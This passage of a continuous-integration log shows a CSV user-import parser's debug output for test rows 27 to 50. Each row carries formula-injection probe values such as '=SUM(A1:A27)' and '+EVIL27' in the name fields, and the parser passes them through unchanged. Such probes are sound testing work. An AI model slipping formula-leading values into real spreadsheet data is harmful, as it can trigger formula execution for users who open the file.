2025-11-18T17:35:41.6285598Z     password: [33m-1[39m
2025-11-18T17:35:41.6285711Z   }
2025-11-18T17:35:41.6285835Z }
2025-11-18T17:35:41.6286060Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6286354Z   email: [32m'user27@example.com'[39m,
2025-11-18T17:35:41.6286645Z   firstName: [32m'=SUM(A1:A27)'[39m,
2025-11-18T17:35:41.6287389Z   lastName: [32m'+EVIL27'[39m,
2025-11-18T17:35:41.6287629Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6287901Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6288031Z }
2025-11-18T17:35:41.6288219Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6288441Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6289203Z   cellValues: [ [32m'user28@example.com'[39m, [32m'=SUM(A1:A28)'[39m, [32m'+EVIL28'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6289361Z   columnMapping: {
2025-11-18T17:35:41.6289566Z     email: [33m0[39m,
2025-11-18T17:35:41.6289762Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6289959Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6290133Z     role: [33m3[39m,
2025-11-18T17:35:41.6290319Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6290532Z     password: [33m-1[39m
2025-11-18T17:35:41.6290656Z   }
2025-11-18T17:35:41.6290778Z }
2025-11-18T17:35:41.6291020Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6291340Z   email: [32m'user28@example.com'[39m,
2025-11-18T17:35:41.6291622Z   firstName: [32m'=SUM(A1:A28)'[39m,
2025-11-18T17:35:41.6291869Z   lastName: [32m'+EVIL28'[39m,
2025-11-18T17:35:41.6292064Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6292314Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6292429Z }
2025-11-18T17:35:41.6292608Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6292812Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6293751Z   cellValues: [ [32m'user29@example.com'[39m, [32m'=SUM(A1:A29)'[39m, [32m'+EVIL29'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6293923Z   columnMapping: {
2025-11-18T17:35:41.6294122Z     email: [33m0[39m,
2025-11-18T17:35:41.6294320Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6294514Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6294693Z     role: [33m3[39m,
2025-11-18T17:35:41.6294867Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6295060Z     password: [33m-1[39m
2025-11-18T17:35:41.6295182Z   }
2025-11-18T17:35:41.6295295Z }
2025-11-18T17:35:41.6295525Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6295815Z   email: [32m'user29@example.com'[39m,
2025-11-18T17:35:41.6296086Z   firstName: [32m'=SUM(A1:A29)'[39m,
2025-11-18T17:35:41.6296323Z   lastName: [32m'+EVIL29'[39m,
2025-11-18T17:35:41.6296519Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6296952Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6297073Z }
2025-11-18T17:35:41.6297260Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6297466Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6298199Z   cellValues: [ [32m'user30@example.com'[39m, [32m'=SUM(A1:A30)'[39m, [32m'+EVIL30'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6298353Z   columnMapping: {
2025-11-18T17:35:41.6298565Z     email: [33m0[39m,
2025-11-18T17:35:41.6298784Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6298987Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6299186Z     role: [33m3[39m,
2025-11-18T17:35:41.6299368Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6299582Z     password: [33m-1[39m
2025-11-18T17:35:41.6299710Z   }
2025-11-18T17:35:41.6299831Z }
2025-11-18T17:35:41.6300084Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6300407Z   email: [32m'user30@example.com'[39m,
2025-11-18T17:35:41.6300705Z   firstName: [32m'=SUM(A1:A30)'[39m,
2025-11-18T17:35:41.6300962Z   lastName: [32m'+EVIL30'[39m,
2025-11-18T17:35:41.6301177Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6301429Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6301554Z }
2025-11-18T17:35:41.6301739Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6301935Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6302680Z   cellValues: [ [32m'user31@example.com'[39m, [32m'=SUM(A1:A31)'[39m, [32m'+EVIL31'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6302822Z   columnMapping: {
2025-11-18T17:35:41.6303018Z     email: [33m0[39m,
2025-11-18T17:35:41.6303211Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6303408Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6303586Z     role: [33m3[39m,
2025-11-18T17:35:41.6303776Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6304209Z     password: [33m-1[39m
2025-11-18T17:35:41.6304330Z   }
2025-11-18T17:35:41.6304457Z }
2025-11-18T17:35:41.6304698Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6305027Z   email: [32m'user31@example.com'[39m,
2025-11-18T17:35:41.6305315Z   firstName: [32m'=SUM(A1:A31)'[39m,
2025-11-18T17:35:41.6305559Z   lastName: [32m'+EVIL31'[39m,
2025-11-18T17:35:41.6305776Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6306034Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6306162Z }
2025-11-18T17:35:41.6306344Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6306550Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6307507Z   cellValues: [ [32m'user32@example.com'[39m, [32m'=SUM(A1:A32)'[39m, [32m'+EVIL32'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6307677Z   columnMapping: {
2025-11-18T17:35:41.6307920Z     email: [33m0[39m,
2025-11-18T17:35:41.6308137Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6308361Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6308576Z     role: [33m3[39m,
2025-11-18T17:35:41.6308791Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6309017Z     password: [33m-1[39m
2025-11-18T17:35:41.6309144Z   }
2025-11-18T17:35:41.6309279Z }
2025-11-18T17:35:41.6309526Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6309861Z   email: [32m'user32@example.com'[39m,
2025-11-18T17:35:41.6310154Z   firstName: [32m'=SUM(A1:A32)'[39m,
2025-11-18T17:35:41.6310652Z   lastName: [32m'+EVIL32'[39m,
2025-11-18T17:35:41.6310912Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6311174Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6311301Z }
2025-11-18T17:35:41.6311494Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6311724Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6312492Z   cellValues: [ [32m'user33@example.com'[39m, [32m'=SUM(A1:A33)'[39m, [32m'+EVIL33'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6312667Z   columnMapping: {
2025-11-18T17:35:41.6312895Z     email: [33m0[39m,
2025-11-18T17:35:41.6313107Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6313345Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6313546Z     role: [33m3[39m,
2025-11-18T17:35:41.6313750Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6313961Z     password: [33m-1[39m
2025-11-18T17:35:41.6314093Z   }
2025-11-18T17:35:41.6314212Z }
2025-11-18T17:35:41.6314443Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6314754Z   email: [32m'user33@example.com'[39m,
2025-11-18T17:35:41.6315035Z   firstName: [32m'=SUM(A1:A33)'[39m,
2025-11-18T17:35:41.6315308Z   lastName: [32m'+EVIL33'[39m,
2025-11-18T17:35:41.6315535Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6315820Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6316025Z }
2025-11-18T17:35:41.6316226Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6316480Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6317428Z   cellValues: [ [32m'user34@example.com'[39m, [32m'=SUM(A1:A34)'[39m, [32m'+EVIL34'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6317596Z   columnMapping: {
2025-11-18T17:35:41.6317825Z     email: [33m0[39m,
2025-11-18T17:35:41.6318035Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6318225Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6318410Z     role: [33m3[39m,
2025-11-18T17:35:41.6318594Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6318794Z     password: [33m-1[39m
2025-11-18T17:35:41.6318921Z   }
2025-11-18T17:35:41.6319040Z }
2025-11-18T17:35:41.6319285Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6319584Z   email: [32m'user34@example.com'[39m,
2025-11-18T17:35:41.6319867Z   firstName: [32m'=SUM(A1:A34)'[39m,
2025-11-18T17:35:41.6320120Z   lastName: [32m'+EVIL34'[39m,
2025-11-18T17:35:41.6320326Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6320590Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6320708Z }
2025-11-18T17:35:41.6320890Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6321083Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6321819Z   cellValues: [ [32m'user35@example.com'[39m, [32m'=SUM(A1:A35)'[39m, [32m'+EVIL35'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6322219Z   columnMapping: {
2025-11-18T17:35:41.6322459Z     email: [33m0[39m,
2025-11-18T17:35:41.6322689Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6322898Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6323112Z     role: [33m3[39m,
2025-11-18T17:35:41.6323316Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6323533Z     password: [33m-1[39m
2025-11-18T17:35:41.6323654Z   }
2025-11-18T17:35:41.6323784Z }
2025-11-18T17:35:41.6324029Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6324335Z   email: [32m'user35@example.com'[39m,
2025-11-18T17:35:41.6324619Z   firstName: [32m'=SUM(A1:A35)'[39m,
2025-11-18T17:35:41.6324877Z   lastName: [32m'+EVIL35'[39m,
2025-11-18T17:35:41.6325095Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6325358Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6325480Z }
2025-11-18T17:35:41.6325671Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6325881Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6326664Z   cellValues: [ [32m'user36@example.com'[39m, [32m'=SUM(A1:A36)'[39m, [32m'+EVIL36'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6327033Z   columnMapping: {
2025-11-18T17:35:41.6327280Z     email: [33m0[39m,
2025-11-18T17:35:41.6327491Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6327713Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6327909Z     role: [33m3[39m,
2025-11-18T17:35:41.6328118Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6328565Z     password: [33m-1[39m
2025-11-18T17:35:41.6328709Z   }
2025-11-18T17:35:41.6328844Z }
2025-11-18T17:35:41.6329094Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6329419Z   email: [32m'user36@example.com'[39m,
2025-11-18T17:35:41.6329711Z   firstName: [32m'=SUM(A1:A36)'[39m,
2025-11-18T17:35:41.6329967Z   lastName: [32m'+EVIL36'[39m,
2025-11-18T17:35:41.6330201Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6330463Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6330589Z }
2025-11-18T17:35:41.6330778Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6331022Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6331809Z   cellValues: [ [32m'user37@example.com'[39m, [32m'=SUM(A1:A37)'[39m, [32m'+EVIL37'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6331970Z   columnMapping: {
2025-11-18T17:35:41.6332187Z     email: [33m0[39m,
2025-11-18T17:35:41.6332397Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6332607Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6332803Z     role: [33m3[39m,
2025-11-18T17:35:41.6333003Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6333222Z     password: [33m-1[39m
2025-11-18T17:35:41.6333345Z   }
2025-11-18T17:35:41.6333480Z }
2025-11-18T17:35:41.6333718Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6334040Z   email: [32m'user37@example.com'[39m,
2025-11-18T17:35:41.6334330Z   firstName: [32m'=SUM(A1:A37)'[39m,
2025-11-18T17:35:41.6334596Z   lastName: [32m'+EVIL37'[39m,
2025-11-18T17:35:41.6334819Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6335073Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6335217Z }
2025-11-18T17:35:41.6335406Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6335623Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6336368Z   cellValues: [ [32m'user38@example.com'[39m, [32m'=SUM(A1:A38)'[39m, [32m'+EVIL38'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6336522Z   columnMapping: {
2025-11-18T17:35:41.6336713Z     email: [33m0[39m,
2025-11-18T17:35:41.6337207Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6337431Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6337616Z     role: [33m3[39m,
2025-11-18T17:35:41.6337809Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6338013Z     password: [33m-1[39m
2025-11-18T17:35:41.6338138Z   }
2025-11-18T17:35:41.6338255Z }
2025-11-18T17:35:41.6338488Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6338787Z   email: [32m'user38@example.com'[39m,
2025-11-18T17:35:41.6339059Z   firstName: [32m'=SUM(A1:A38)'[39m,
2025-11-18T17:35:41.6339316Z   lastName: [32m'+EVIL38'[39m,
2025-11-18T17:35:41.6339520Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6340071Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6340195Z }
2025-11-18T17:35:41.6340382Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6340599Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6341354Z   cellValues: [ [32m'user39@example.com'[39m, [32m'=SUM(A1:A39)'[39m, [32m'+EVIL39'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6341508Z   columnMapping: {
2025-11-18T17:35:41.6341713Z     email: [33m0[39m,
2025-11-18T17:35:41.6341921Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6342120Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6342312Z     role: [33m3[39m,
2025-11-18T17:35:41.6342497Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6342701Z     password: [33m-1[39m
2025-11-18T17:35:41.6342828Z   }
2025-11-18T17:35:41.6342946Z }
2025-11-18T17:35:41.6343186Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6343483Z   email: [32m'user39@example.com'[39m,
2025-11-18T17:35:41.6343760Z   firstName: [32m'=SUM(A1:A39)'[39m,
2025-11-18T17:35:41.6344020Z   lastName: [32m'+EVIL39'[39m,
2025-11-18T17:35:41.6344223Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6344480Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6344598Z }
2025-11-18T17:35:41.6344792Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6344989Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6345900Z   cellValues: [ [32m'user40@example.com'[39m, [32m'=SUM(A1:A40)'[39m, [32m'+EVIL40'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6346065Z   columnMapping: {
2025-11-18T17:35:41.6346272Z     email: [33m0[39m,
2025-11-18T17:35:41.6346481Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6346680Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6347075Z     role: [33m3[39m,
2025-11-18T17:35:41.6347280Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6347510Z     password: [33m-1[39m
2025-11-18T17:35:41.6347632Z   }
2025-11-18T17:35:41.6347756Z }
2025-11-18T17:35:41.6348003Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6348317Z   email: [32m'user40@example.com'[39m,
2025-11-18T17:35:41.6348642Z   firstName: [32m'=SUM(A1:A40)'[39m,
2025-11-18T17:35:41.6348911Z   lastName: [32m'+EVIL40'[39m,
2025-11-18T17:35:41.6349127Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6349376Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6349501Z }
2025-11-18T17:35:41.6349710Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6349959Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6350750Z   cellValues: [ [32m'user41@example.com'[39m, [32m'=SUM(A1:A41)'[39m, [32m'+EVIL41'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6350910Z   columnMapping: {
2025-11-18T17:35:41.6351134Z     email: [33m0[39m,
2025-11-18T17:35:41.6351346Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6351561Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6351746Z     role: [33m3[39m,
2025-11-18T17:35:41.6351939Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6352166Z     password: [33m-1[39m
2025-11-18T17:35:41.6352290Z   }
2025-11-18T17:35:41.6352420Z }
2025-11-18T17:35:41.6352658Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6352990Z   email: [32m'user41@example.com'[39m,
2025-11-18T17:35:41.6353293Z   firstName: [32m'=SUM(A1:A41)'[39m,
2025-11-18T17:35:41.6353559Z   lastName: [32m'+EVIL41'[39m,
2025-11-18T17:35:41.6353785Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6354050Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6354173Z }
2025-11-18T17:35:41.6354349Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6354575Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6355239Z   cellValues: [ [32m'user42@example.com'[39m, [32m'=SUM(A1:A42)'[39m, [32m'+EVIL42'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6355383Z   columnMapping: {
2025-11-18T17:35:41.6355583Z     email: [33m0[39m,
2025-11-18T17:35:41.6355788Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6355996Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6356179Z     role: [33m3[39m,
2025-11-18T17:35:41.6356373Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6356562Z     password: [33m-1[39m
2025-11-18T17:35:41.6357114Z   }
2025-11-18T17:35:41.6357231Z }
2025-11-18T17:35:41.6357455Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6357781Z   email: [32m'user42@example.com'[39m,
2025-11-18T17:35:41.6358052Z   firstName: [32m'=SUM(A1:A42)'[39m,
2025-11-18T17:35:41.6358289Z   lastName: [32m'+EVIL42'[39m,
2025-11-18T17:35:41.6358489Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6358728Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6358861Z }
2025-11-18T17:35:41.6359046Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6359250Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6359960Z   cellValues: [ [32m'user43@example.com'[39m, [32m'=SUM(A1:A43)'[39m, [32m'+EVIL43'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6360103Z   columnMapping: {
2025-11-18T17:35:41.6360289Z     email: [33m0[39m,
2025-11-18T17:35:41.6360473Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6360661Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6360832Z     role: [33m3[39m,
2025-11-18T17:35:41.6361016Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6361217Z     password: [33m-1[39m
2025-11-18T17:35:41.6361337Z   }
2025-11-18T17:35:41.6361450Z }
2025-11-18T17:35:41.6361671Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6361950Z   email: [32m'user43@example.com'[39m,
2025-11-18T17:35:41.6362209Z   firstName: [32m'=SUM(A1:A43)'[39m,
2025-11-18T17:35:41.6362452Z   lastName: [32m'+EVIL43'[39m,
2025-11-18T17:35:41.6362847Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6363115Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6363234Z }
2025-11-18T17:35:41.6363414Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6363683Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6364421Z   cellValues: [ [32m'user44@example.com'[39m, [32m'=SUM(A1:A44)'[39m, [32m'+EVIL44'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6364656Z   columnMapping: {
2025-11-18T17:35:41.6364888Z     email: [33m0[39m,
2025-11-18T17:35:41.6365181Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6365551Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6365820Z     role: [33m3[39m,
2025-11-18T17:35:41.6366101Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6366344Z     password: [33m-1[39m
2025-11-18T17:35:41.6366607Z   }
2025-11-18T17:35:41.6366746Z }
2025-11-18T17:35:41.6367491Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6367882Z   email: [32m'user44@example.com'[39m,
2025-11-18T17:35:41.6368227Z   firstName: [32m'=SUM(A1:A44)'[39m,
2025-11-18T17:35:41.6368617Z   lastName: [32m'+EVIL44'[39m,
2025-11-18T17:35:41.6368888Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6369380Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6386593Z }
2025-11-18T17:35:41.6387147Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6387446Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6388218Z   cellValues: [ [32m'user45@example.com'[39m, [32m'=SUM(A1:A45)'[39m, [32m'+EVIL45'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6388383Z   columnMapping: {
2025-11-18T17:35:41.6388598Z     email: [33m0[39m,
2025-11-18T17:35:41.6388809Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6389028Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6389215Z     role: [33m3[39m,
2025-11-18T17:35:41.6389411Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6389615Z     password: [33m-1[39m
2025-11-18T17:35:41.6389742Z   }
2025-11-18T17:35:41.6389864Z }
2025-11-18T17:35:41.6390110Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6390426Z   email: [32m'user45@example.com'[39m,
2025-11-18T17:35:41.6390720Z   firstName: [32m'=SUM(A1:A45)'[39m,
2025-11-18T17:35:41.6390986Z   lastName: [32m'+EVIL45'[39m,
2025-11-18T17:35:41.6391193Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6391465Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6391585Z }
2025-11-18T17:35:41.6391784Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6391998Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6392735Z   cellValues: [ [32m'user46@example.com'[39m, [32m'=SUM(A1:A46)'[39m, [32m'+EVIL46'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6392893Z   columnMapping: {
2025-11-18T17:35:41.6393326Z     email: [33m0[39m,
2025-11-18T17:35:41.6393531Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6393723Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6393909Z     role: [33m3[39m,
2025-11-18T17:35:41.6394090Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6394285Z     password: [33m-1[39m
2025-11-18T17:35:41.6394408Z   }
2025-11-18T17:35:41.6394521Z }
2025-11-18T17:35:41.6394761Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6395046Z   email: [32m'user46@example.com'[39m,
2025-11-18T17:35:41.6395313Z   firstName: [32m'=SUM(A1:A46)'[39m,
2025-11-18T17:35:41.6395553Z   lastName: [32m'+EVIL46'[39m,
2025-11-18T17:35:41.6395745Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6395993Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6396109Z }
2025-11-18T17:35:41.6396296Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6396496Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6397459Z   cellValues: [ [32m'user47@example.com'[39m, [32m'=SUM(A1:A47)'[39m, [32m'+EVIL47'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6397614Z   columnMapping: {
2025-11-18T17:35:41.6397814Z     email: [33m0[39m,
2025-11-18T17:35:41.6398012Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6398202Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6398382Z     role: [33m3[39m,
2025-11-18T17:35:41.6398555Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6398752Z     password: [33m-1[39m
2025-11-18T17:35:41.6398865Z   }
2025-11-18T17:35:41.6399166Z }
2025-11-18T17:35:41.6399399Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6399684Z   email: [32m'user47@example.com'[39m,
2025-11-18T17:35:41.6399954Z   firstName: [32m'=SUM(A1:A47)'[39m,
2025-11-18T17:35:41.6400194Z   lastName: [32m'+EVIL47'[39m,
2025-11-18T17:35:41.6400402Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6400642Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6400756Z }
2025-11-18T17:35:41.6400942Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6401133Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6401870Z   cellValues: [ [32m'user48@example.com'[39m, [32m'=SUM(A1:A48)'[39m, [32m'+EVIL48'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6402008Z   columnMapping: {
2025-11-18T17:35:41.6402198Z     email: [33m0[39m,
2025-11-18T17:35:41.6402386Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6402574Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6402748Z     role: [33m3[39m,
2025-11-18T17:35:41.6402920Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6403125Z     password: [33m-1[39m
2025-11-18T17:35:41.6403240Z   }
2025-11-18T17:35:41.6403359Z }
2025-11-18T17:35:41.6403587Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6403879Z   email: [32m'user48@example.com'[39m,
2025-11-18T17:35:41.6404140Z   firstName: [32m'=SUM(A1:A48)'[39m,
2025-11-18T17:35:41.6404375Z   lastName: [32m'+EVIL48'[39m,
2025-11-18T17:35:41.6404575Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6404805Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6404922Z }
2025-11-18T17:35:41.6405096Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6405311Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6406033Z   cellValues: [ [32m'user49@example.com'[39m, [32m'=SUM(A1:A49)'[39m, [32m'+EVIL49'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6406174Z   columnMapping: {
2025-11-18T17:35:41.6406368Z     email: [33m0[39m,
2025-11-18T17:35:41.6406557Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6406749Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6407238Z     role: [33m3[39m,
2025-11-18T17:35:41.6407435Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6407639Z     password: [33m-1[39m
2025-11-18T17:35:41.6407753Z   }
2025-11-18T17:35:41.6407873Z }
2025-11-18T17:35:41.6408098Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6408386Z   email: [32m'user49@example.com'[39m,
2025-11-18T17:35:41.6408638Z   firstName: [32m'=SUM(A1:A49)'[39m,
2025-11-18T17:35:41.6408889Z   lastName: [32m'+EVIL49'[39m,
2025-11-18T17:35:41.6409086Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6409328Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6409678Z }
2025-11-18T17:35:41.6409865Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6410084Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6410811Z   cellValues: [ [32m'user50@example.com'[39m, [32m'=SUM(A1:A50)'[39m, [32m'+EVIL50'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6410963Z   columnMapping: {
2025-11-18T17:35:41.6411149Z     email: [33m0[39m,
2025-11-18T17:35:41.6411355Z     firstName: [33m1[39m,
